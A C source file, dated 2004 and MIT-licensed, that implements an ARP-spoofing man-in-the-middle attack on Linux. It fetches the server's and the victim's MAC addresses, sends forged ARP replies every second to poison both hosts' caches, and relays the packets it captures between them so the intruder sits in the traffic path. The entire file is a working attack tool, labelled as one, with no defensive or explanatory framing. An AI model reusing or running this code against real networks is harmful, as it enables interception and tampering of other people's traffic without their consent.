/*
   Copyright (c) 2004 Daniel Lerch Hostalot <dlerch@gmail.com>

   Permission is hereby granted, free of charge, to any person obtaining a 
   copy of this software and associated documentation files (the "Software"), 
   to deal in the Software without restriction, including without limitation
   the rights to use, copy, modify, merge, publish, distribute, sublicense, 
   and/or sell copies of the Software, and to permit persons to whom the 
   Software is furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in 
   all copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL 
   THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING 
   FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER 
   DEALINGS IN THE SOFTWARE.
*/


/*
   Man in the middle attack using ARP spoofing.

    SERVER                        VICTIM
    S_mac                         V_mac
    S_ip                          V_ip
    HOST A (S)  _____       _____ (V) HOST V
                     \     / 
                      \   /
                       \ /
                        |
                        |
                       (I)
                     INTRUDER
                     I_mac
                     I_ip

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <errno.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>  
#include <sys/wait.h>  


struct arp_hdr 
{
   unsigned short int hardware;
   unsigned short int protocol;
   char hw_addr_len;  
   char proto_addr_len;
   unsigned short operation;
   char src_addr[6];
   char src_ip[4];
   char dst_addr[6];
   char dst_ip[4];
};


// {{{ send_packet()
void send_packet(char* buffer, int len) 
{
 
   struct sockaddr addr;
   char dev[5];
   int sock;

   strncpy(dev, "eth0", 5);

   if ((sock = socket(AF_INET,SOCK_PACKET,htons(ETH_P_ARP)))==-1) 
	{ 
      perror("socket()"); 
      exit(EXIT_FAILURE); 
   }

   strncpy(addr.sa_data, dev, sizeof(addr.sa_data));

   if ((sendto(sock, buffer, len, 0, 
        &addr, sizeof(struct sockaddr)))==-1) 
	{
      perror("sendto()");
      exit(EXIT_FAILURE);
   }

   close (sock); 
}
// }}}
   
// {{{ send_arp_packet()
/* Send an ARP packet (spoofing) configuring source and destination MAC 
	address. */
void send_arp_packet(int *src_mac, 
                     int *src_ip, 
                     int *dst_mac, 
                     int *dst_ip) {

   int sock;

   unsigned int buffer_size = 
   sizeof(struct arp_hdr) + sizeof(struct ether_header);

   unsigned char buffer[buffer_size];
   memset(buffer,0,buffer_size);

   struct ether_header *eth = (struct ether_header *)buffer;

   struct arp_hdr *arp = 
   (struct arp_hdr *)(buffer + sizeof(struct ether_header));


   char dev[5];
   strncpy(dev, "eth0", 5);

   if ((sock = socket(AF_INET,SOCK_PACKET,htons(ETH_P_ARP)))==-1) 
	{ 
      
      perror("socket()"); 
      exit(EXIT_FAILURE); 
   }

   /* Ethernet header */
   memcpy(eth->ether_dhost,dst_mac,ETHER_ADDR_LEN);
   memcpy(eth->ether_shost,src_mac,ETHER_ADDR_LEN);
   eth->ether_type = htons(ETHERTYPE_ARP);

   /* ARP header */
   arp->hardware = htons(ARPHRD_ETHER);
   arp->protocol = htons(ETH_P_IP);
   arp->hw_addr_len = 6;     
   arp->proto_addr_len = 4;
   arp->operation = htons(ARPOP_REPLY);
   memcpy(arp->src_addr, src_mac,6);
   memcpy(arp->src_ip, src_ip, 4);
   memcpy(arp->dst_addr, dst_mac, 6);
   memcpy(arp->dst_ip, dst_ip, 4);

   struct sockaddr addr;
   strncpy(addr.sa_data, dev, sizeof(addr.sa_data));

   if ((sendto(sock, buffer, buffer_size, 0, 
        &addr, sizeof(struct sockaddr)))==-1) 
	{
      perror("sendto()");
      exit(EXIT_FAILURE);
   }
}
// }}}

// {{{ redirect_packet()
/* Packet redirection between victim and server */
void redirect_packet(int *I_mac,
                     int *S_mac,
                     int *S_ip,
                     int *V_mac,
                     int *V_ip ) {

   int sock;
   
   char buffer[1500];
                                                                                
   struct ether_header *eth = (struct ether_header *) buffer;
                                                                                
   struct iphdr *ip =
   (struct iphdr  *) (buffer + sizeof(struct ether_header));
                                                                              
   struct tcphdr *tcp = 
   (struct tcphdr *)(buffer + sizeof(struct iphdr));

   char *data = 
   (char*)(buffer + sizeof(struct iphdr) + sizeof(struct tcphdr));
  
   /* capture all packets */
   if((sock = socket(AF_INET, SOCK_PACKET, htons(0x3))) == -1) 
	{
      perror("socket()");
      exit(EXIT_FAILURE);
   }


   for(;;) 
	{
      size_t buffer_size = 0;

      read(sock, buffer, sizeof(buffer));   

      buffer_size = htons(ip->tot_len)+14;  

      /* Packet from Victim to Server */
      if (  (ip->saddr ==  *(unsigned long int*)V_ip) &&
            (ip->daddr ==  *(unsigned long int*)S_ip) ) 
		{
         
         if (  (*(unsigned long int*)I_mac != 
                *(unsigned long int*)eth->ether_shost ) &&
               (*(unsigned long int*)S_mac != 
                *(unsigned long int*)eth->ether_dhost ) ) 
			{

            memcpy(eth->ether_shost, I_mac, 6);
            memcpy(eth->ether_dhost, S_mac, 6);
            send_packet (buffer, buffer_size); 
         }
      }

      /* Packet form Server to Victim */
      if (  (ip->saddr ==  *(unsigned long int*)S_ip) &&
            (ip->daddr ==  *(unsigned long int*)V_ip) ) 
		{

         if (  (*(unsigned long int*)I_mac != 
                *(unsigned long int*)eth->ether_shost ) &&
               (*(unsigned long int*)V_mac != 
                *(unsigned long int*)eth->ether_dhost ) ) 
			{
            memcpy(eth->ether_shost, I_mac, 6);
            memcpy(eth->ether_dhost, V_mac, 6);
            send_packet (buffer, buffer_size); 
         }
      }
      
   }

}
// }}}

// {{{ getmacfromarpcache()
char* getmacfromarpcache (char *ipaddr) 
{

   char  ip[100];
   int   type;
   int   flags;
   static char arpaddr[100];
   char  mask[100];
   char  dev[100];
   char  line[200];
   int   pid;
   int   status;
   FILE *fp;

   if ((fp = fopen("/proc/net/arp", "r")) == NULL) 
	{
        perror("fopen()");
        exit(1);
    }
     
    if (fgets(line, sizeof(line), fp) != NULL) 
	{
      while (fgets(line, sizeof(line), fp))  
		{
         sscanf(line, "%s 0x%x 0x%x %100s %100s %100s\n",
                ip, &type, &flags, arpaddr, mask, dev);

         if (strcmp(ip, ipaddr)==0) return arpaddr;
      }
    }    

   fclose(fp);  
   
   /* refresh cache */
   if ((pid=fork()) < 0) 
	{
      perror("fork()"); 
      exit(1);
   }
   if (pid==0) 
	{
      execl("/bin/ping", "ping", "-c", "1", ipaddr, 0);
      exit(1); 
   }  

   wait(&status);
   if (status==0) return getmacfromarpcache(ipaddr); 
   else 
	{
      printf("ping error\n"); 
      return "";
   }
   
}
// }}}

// {{{ inetaddr()
char *inetaddr(u_int32_t ip) 
{
   struct in_addr in;
   in.s_addr = ip;
   return inet_ntoa(in);
}
// }}} 
  



int main (int argc, char **argv) 
{

   struct ifreq if_data;
   int sockd;

   /* IPs & MACs */
   unsigned int S_ip[4];  
   unsigned int S_mac[6]; 
   unsigned int V_ip[5];  
   unsigned int V_mac[6]; 
   unsigned int I_ip[4];  
   unsigned int I_mac[6]; 

   u_int32_t local_ip;

   if (argc!=3) 	
	{
      printf ("%s ip_server ip_victim\n", argv[0]);
      exit(EXIT_FAILURE);
   }

   /* Read params */
   sscanf (argv[1], "%d.%d.%d.%d", &S_ip[0], &S_ip[1], &S_ip[2], &S_ip[3]);
   sscanf (argv[2], "%d.%d.%d.%d", &V_ip[0], &V_ip[1], &V_ip[2], &V_ip[3]);

   /* server's MAC */
   sscanf (getmacfromarpcache(argv[1]) ,"%2X:%2X:%2X:%2X:%2X:%2X", 
           &S_mac[0], &S_mac[1], &S_mac[2], &S_mac[3], &S_mac[4], &S_mac[5]);

   /* victim's MAC */
   sscanf (getmacfromarpcache(argv[2]) ,"%2X:%2X:%2X:%2X:%2X:%2X", 
           &V_mac[0], &V_mac[1], &V_mac[2], &V_mac[3], &V_mac[4], &V_mac[5]);

   if ((sockd = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
   {
      perror("socket");
      exit (0);
   }

   strcpy (if_data.ifr_name, "eth0");

   /* Intruder's MAC */
   if (ioctl (sockd, SIOCGIFHWADDR, &if_data) < 0) 
	{
      perror ("ioctl(): SIOCGIFHWADDR \n");
      exit(EXIT_FAILURE);
   }
   memcpy (I_mac, if_data.ifr_hwaddr.sa_data, 6);

   /* Intruder's IP */ 
   if (ioctl (sockd, SIOCGIFADDR, &if_data) < 0) {
      perror ("ioctl(); SIOCGIFADDR \n");
      exit(EXIT_FAILURE);
   }                      
   memcpy ((void *) &local_ip, (void *) &if_data.ifr_addr.sa_data + 2, 4);

   sscanf (inetaddr(local_ip), "%d.%d.%d.%d", 
           &I_ip[0], &I_ip[1], &I_ip[2], &I_ip[3]);


   printf("\n\n       %s\t\t%s \n" \
          "           (S)  _____       _____ (V)         \n" \
          "                     \\     /                 \n" \
          "                      \\   /                  \n" \
          "                       \\ /                   \n" \
          "                        |                     \n" \
          "                       (I)                    \n" \
          "                  %s                          \n\n\n",
          argv[1], argv[2], inetaddr(local_ip) );


   int pid = fork();
   if (pid < 0) 	
	{
      printf ("fork()");
      exit(EXIT_FAILURE);
   }

   if (pid != 0) 
	{
      while (1) 
		{

         /* Tell victim that "Server's IP" has "Intruder's MAC" */
         send_arp_packet(I_mac, S_ip, V_mac, V_ip);

         /* Tell server that "Victim's IP" has "Intruder's MAC" */
         send_arp_packet (I_mac, V_ip, S_mac, S_ip);
      
         sleep(1);
      }
   }

   else 
	{
      redirect_packet(I_mac, S_mac, S_ip, V_mac, V_ip );
   }

   return 0;
}

